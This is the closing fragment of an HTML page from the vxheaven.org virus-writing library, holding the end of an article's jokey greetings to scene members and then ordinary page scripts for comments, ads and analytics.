<dt>SkyOut</dt><dd>~HOPE!</dd>
<dt>blueowl</dt><dd>~where the hell was the hello to me in rrlf like you promised!?!?!?!?!?!??!</dd>
<dt>dr3f</dt><dd>~I want your bot's when you die! *KILLS YOU*</dd>
<dt>falckon</dt><dd>~genetical? falckonisity!</dd>
<dt>kefi</dt><dd>~I MISS YOOOOOOOOOOOOOOOOOOUUWWWWWWWWW!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! :(</dd>
<dt>synge</dt><dd>~hello hello hello hello hello hello hello hello hello.. bye</dd>
</dl>
<p>And to all eof members: I'm the best! :p If your name is missing it's because i don't like you... or i just forgot, you choose!</p>
[<a style="" href="/lib/?lang=EN&amp;index=MA#vge00">Back to index</a>] [<a href="/lib/vge00.html#disqus_thread">Comments</a>]<br/> <div id="disqus_thread"></div>
<script type="text/rocketscript">
        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
        var disqus_shortname = 'vxheaven'; // required: replace example with your forum shortname

        /* * * DON'T EDIT BELOW THIS LINE * * */
        (function() {
            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        })();
    </script>
<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript></div>
<div><small>By accessing, viewing, downloading or otherwise using this content you agree to be bound by the <a href="/agreement.php">Terms of Use</a>!</small> <small>vxheaven.org aka vx.netlux.org</small></div>
<div style="margin-top: 2px; float: left;" class="adsapeu">
<script type="text/rocketscript">
<!--
var _acic={dataProvider:10};(function(){var e=document.createElement("script");e.type="text/javascript";e.async=true;e.src="//www.acint.net/aci.js";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)})()
//-->
</script>
</div>
<script data-rocketsrc="http://www.google-analytics.com/urchin.js" type="text/rocketscript"></script><script type="text/rocketscript">try { _uacct = "UA-590608-1"; urchinTracker(); } catch(err) {}</script>
<div style="display: none;"><a href="/lib/index.php?lang=de&amp;id=vge00">de</a><a href="/lib/index.php?lang=en&amp;id=vge00">en</a><a href="/lib/index.php?lang=es&amp;id=vge00">es</a><a href="/lib/index.php?lang=it&amp;id=vge00">it</a><a href="/lib/index.php?lang=fr&amp;id=vge00">fr</a><a href="/lib/index.php?lang=pl&amp;id=vge00">pl</a><a href="/lib/index.php?lang=ru&amp;id=vge00">ru</a><a href="/lib/index.php?lang=ua&amp;id=vge00">ua</a></div>
</body>
</html>
